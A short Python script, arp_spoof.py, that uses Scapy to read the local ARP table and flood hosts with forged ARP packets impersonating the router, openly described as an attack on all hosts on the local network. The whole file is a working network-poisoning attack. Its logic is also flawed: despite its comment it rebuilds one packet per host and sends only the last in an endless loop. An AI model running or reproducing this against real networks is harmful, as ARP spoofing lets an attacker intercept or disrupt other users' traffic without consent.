import os

from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.sendrecv import send

# arp_spoof.py
# this is a simply python program/script that will perform a simple ARP spoof
# attack on all hosts on the local network using the Scapy Python library


# get ip addresses of machines on local network
full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]

# loop through and poison ALL hosts
spoof = 'ROUTER IP'  # router IP
op = 1  # Op code 1 for ARP requests
for res in final_results:
	arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])

while 1:
	send(arp)
# time.sleep(2)
